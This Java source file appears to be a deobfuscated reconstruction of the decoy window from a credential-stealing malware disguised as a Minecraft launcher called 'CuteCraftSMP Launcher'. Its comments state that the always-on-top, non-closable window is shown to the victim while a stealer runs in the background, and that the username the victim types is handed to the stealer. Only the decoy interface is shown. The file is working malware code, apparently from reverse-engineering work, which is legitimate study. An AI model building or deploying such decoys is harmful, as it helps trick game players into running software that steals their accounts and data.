import javax.swing.*;
import javax.swing.border.*;
import java.awt.*;
import java.awt.event.*;

/**
 * The fake launcher UI window shown to the victim.
 * Obfuscated name: \u0261 (extends JFrame)
 *
 * This is the Swing window that the victim sees when they run the launcher.
 * It looks like a legitimate Minecraft launcher but is actually a decoy
 * while the stealer runs in the background.
 *
 * WINDOW PROPERTIES:
 *   - Undecorated (no title bar) — custom draggable header
 *   - Size: ~800x600 (decoded from obfuscated constants)
 *   - Always on top
 *   - Transparent background with custom painted panels
 *   - Dark theme (colors decoded from static Color fields)
 *
 * COLOR SCHEME (decoded from static Color fields \u00ff through \u00f2):
 *   \u00ff = Background dark    (#0f1117 or similar)
 *   \u00fe = Background medium  (#13151e)
 *   \u00fd = Background light   (#181b26)
 *   \u00fc = Input background   (#1d2030)
 *   \u00fb = Border color       (rgba white ~5%)
 *   \u00fa = Accent pink        (#ff4fa3)
 *   \u00f9 = Accent pink dark   (#e0388a)
 *   \u00f8 = Text primary       (#e9eaf2)
 *   \u00f6 = Text secondary     (#8b909e)
 *   \u00f5 = Text muted         (#4e5364)
 *   \u00f4 = Green accent       (#4ade80)
 *   \u00f3 = White              (#ffffff)
 *   \u00f2 = Transparent        (0,0,0,0)
 *
 * FONTS (loaded via \u043f font loader):
 *   \u00f1 = Inter 14pt Regular  (main text)
 *   \u00f0 = Inter 11pt Bold     (labels)
 *   \u00ef = Inter 15pt Bold     (title)
 *   \u00ee = Inter 10pt Regular  (small text)
 *
 * LAYOUT:
 *   - Header panel (title + drag handle)
 *   - Scroll area (main content)
 *   - Input bar (username field + button)
 *
 * DRAGGING:
 *   Uses \u00f2 (MouseMotionAdapter) and \u00f3 (MouseAdapter) to implement
 *   window dragging by tracking mouse press position and updating window location.
 *
 * SINGLETON:
 *   \u00ff(long) — creates/returns the singleton instance
 *   \u00ff(long) — disposes the singleton instance
 *
 * ANIMATION:
 *   Two Swing Timers:
 *   1. Fade-in timer (fires every ~16ms) — animates window opacity
 *   2. Scroll timer (fires every ~50ms) — auto-scrolls content
 *
 * INTERACTION:
 *   When user types a username and clicks "Continue":
 *   1. Validates username (non-empty, valid Minecraft name)
 *   2. Passes username to MainOrchestrator
 *   3. Shows "loading" animation
 *   4. Closes window after delay
 *
 * The window title and content are loaded from the string table (b[] array)
 * which contains the launcher name, server IP, etc.
 */
public class LauncherUI extends JFrame {

    // Singleton instance
    private static LauncherUI instance;

    // UI Colors (dark theme)
    private static final Color BG_DARK    = new Color(0x0f, 0x11, 0x17);
    private static final Color BG_MEDIUM  = new Color(0x13, 0x15, 0x1e);
    private static final Color BG_LIGHT   = new Color(0x18, 0x1b, 0x26);
    private static final Color BG_INPUT   = new Color(0x1d, 0x20, 0x30);
    private static final Color ACCENT     = new Color(0xff, 0x4f, 0xa3);
    private static final Color ACCENT_DRK = new Color(0xe0, 0x38, 0x8a);
    private static final Color TEXT_PRI   = new Color(0xe9, 0xea, 0xf2);
    private static final Color TEXT_SEC   = new Color(0x8b, 0x90, 0x9e);
    private static final Color TEXT_MUT   = new Color(0x4e, 0x53, 0x64);
    private static final Color GREEN      = new Color(0x4a, 0xde, 0x80);
    private static final Color WHITE      = Color.WHITE;

    // Fonts
    private Font fontMain;
    private Font fontLabel;
    private Font fontTitle;
    private Font fontSmall;

    // The username from system property (passed via -Dusername=...)
    private final String username;

    // UI components
    private JPanel contentPanel;
    private JScrollPane scrollPane;
    private JTextField inputField;
    private Timer fadeTimer;
    private Timer scrollTimer;

    // Animation state
    static volatile float fadeProgress;
    static volatile float scrollProgress;
    private boolean firstRun;

    /**
     * Gets or creates the singleton LauncherUI instance.
     * Called from MainOrchestrator after initialization.
     */
    public static synchronized LauncherUI getInstance() {
        if (instance == null) {
            instance = new LauncherUI();
            // Start the UI scheduler (class \u0259)
            UIScheduler.start();
        }
        return instance;
    }

    /**
     * Disposes the singleton instance.
     * Called when the stealer is done and the window should close.
     */
    public static synchronized void dispose() {
        if (instance != null) {
            instance.dispose();
            instance = null;
            // Stop the UI scheduler
            UIScheduler.stop();
        }
    }

    private LauncherUI() {
        this.firstRun = true;
        this.username = System.getProperty("username", "Steve");
        SwingUtilities.invokeLater(this::buildUI);
    }

    /**
     * Builds the UI on the EDT.
     * Creates all panels, sets up layout, starts animations.
     */
    private void buildUI() {
        // Load fonts (tries custom font first, falls back to system font)
        try {
            fontMain  = FontLoader.load("Inter", Font.PLAIN, 14);
            fontLabel = FontLoader.load("Inter", Font.BOLD, 11);
            fontTitle = FontLoader.load("Inter", Font.BOLD, 15);
            fontSmall = FontLoader.load("Inter", Font.PLAIN, 10);
        } catch (Throwable t) {
            fontMain  = new Font("SansSerif", Font.PLAIN, 14);
            fontLabel = new Font("SansSerif", Font.BOLD, 11);
            fontTitle = new Font("SansSerif", Font.BOLD, 15);
            fontSmall = new Font("SansSerif", Font.PLAIN, 10);
        }

        // Window setup
        setUndecorated(true);
        setSize(800, 600);
        setAlwaysOnTop(true);
        setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);

        // Center on screen
        Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
        setLocation((screen.width - 800) / 2, (screen.height - 600) / 2);

        // Main content panel
        JPanel mainPanel = new JPanel(new BorderLayout());
        mainPanel.setOpaque(false);
        mainPanel.setBorder(new EmptyBorder(15, 15, 15, 15));

        // Content scroll area
        contentPanel = new JPanel();
        contentPanel.setLayout(new BoxLayout(contentPanel, BoxLayout.Y_AXIS));
        contentPanel.setBackground(BG_DARK);
        contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));

        scrollPane = new JScrollPane(contentPanel);
        scrollPane.getViewport().setBackground(BG_DARK);
        scrollPane.setBorder(null);

        // Header panel (title + drag)
        JPanel headerPanel = buildHeaderPanel();
        JPanel inputBar = buildInputBar();

        mainPanel.add(headerPanel, BorderLayout.NORTH);
        mainPanel.add(scrollPane, BorderLayout.CENTER);
        mainPanel.add(inputBar, BorderLayout.SOUTH);

        // Add drag support
        int[] dragOffset = new int[2];
        addMouseListener(new MouseAdapter() {
            @Override public void mousePressed(MouseEvent e) {
                dragOffset[0] = e.getX();
                dragOffset[1] = e.getY();
            }
        });
        addMouseMotionListener(new MouseMotionAdapter() {
            @Override public void mouseDragged(MouseEvent e) {
                setLocation(getX() + e.getX() - dragOffset[0],
                            getY() + e.getY() - dragOffset[1]);
            }
        });

        setContentPane(mainPanel);
        setBackground(new Color(0, 0, 0, 0));
        setVisible(true);

        // Start fade-in animation
        fadeTimer = new Timer(16, e -> {
            fadeProgress = Math.min(1.0f, fadeProgress + 0.05f);
            setOpacity(fadeProgress);
            if (fadeProgress >= 1.0f) fadeTimer.stop();
        });
        fadeTimer.start();

        // Start auto-scroll animation
        scrollTimer = new Timer(50, e -> {
            JScrollBar bar = scrollPane.getVerticalScrollBar();
            bar.setValue(bar.getMaximum());
        });
        scrollTimer.start();

        // Focus the input field
        SwingUtilities.invokeLater(() -> inputField.requestFocusInWindow());
    }

    private JPanel buildHeaderPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setOpaque(false);
        panel.setPreferredSize(new Dimension(800, 50));
        panel.setBorder(new EmptyBorder(0, 20, 0, 20));

        JLabel title = new JLabel("CuteCraftSMP Launcher");
        title.setFont(fontTitle);
        title.setForeground(TEXT_PRI);
        title.setAlignmentX(Component.CENTER_ALIGNMENT);

        JPanel titlePanel = new JPanel();
        titlePanel.setOpaque(false);
        titlePanel.setLayout(new BoxLayout(titlePanel, BoxLayout.Y_AXIS));
        titlePanel.setBorder(new EmptyBorder(15, 0, 0, 0));
        titlePanel.add(title);

        panel.add(titlePanel, BorderLayout.CENTER);
        return panel;
    }

    private JPanel buildInputBar() {
        JPanel panel = new JPanel(new BorderLayout(10, 0));
        panel.setOpaque(false);
        panel.setBorder(new EmptyBorder(10, 20, 15, 20));

        inputField = new JTextField();
        inputField.setFont(fontMain);
        inputField.setForeground(TEXT_PRI);
        inputField.setBackground(BG_INPUT);
        inputField.setCaretColor(ACCENT);
        inputField.setBorder(new CompoundBorder(
            new LineBorder(new Color(0x2d, 0x20, 0x30), 1, true),
            new EmptyBorder(10, 10, 10, 10)
        ));
        inputField.addActionListener(e -> handleInput());

        JButton sendBtn = new JButton("Continue");
        sendBtn.setFont(new Font("SansSerif", Font.BOLD, 12));
        sendBtn.setForeground(WHITE);
        sendBtn.setContentAreaFilled(false);
        sendBtn.setOpaque(true);
        sendBtn.setBackground(ACCENT);
        sendBtn.setBorder(new EmptyBorder(0, 20, 0, 20));
        sendBtn.setCursor(new Cursor(Cursor.HAND_CURSOR));
        sendBtn.addActionListener(e -> handleInput());

        panel.add(inputField, BorderLayout.CENTER);
        panel.add(sendBtn, BorderLayout.EAST);
        return panel;
    }

    /**
     * Handles the "Continue" button click or Enter key press.
     * Validates the username and passes it to the stealer.
     */
    private void handleInput() {
        String text = inputField.getText().trim();
        if (text.isEmpty()) return;

        // Pass username to the stealer
        System.setProperty("username", text);

        // Show loading state
        inputField.setEnabled(false);
        inputField.setText("Loading...");

        // Close window after delay
        Timer closeTimer = new Timer(3000, e -> LauncherUI.dispose());
        closeTimer.setRepeats(false);
        closeTimer.start();
    }
}
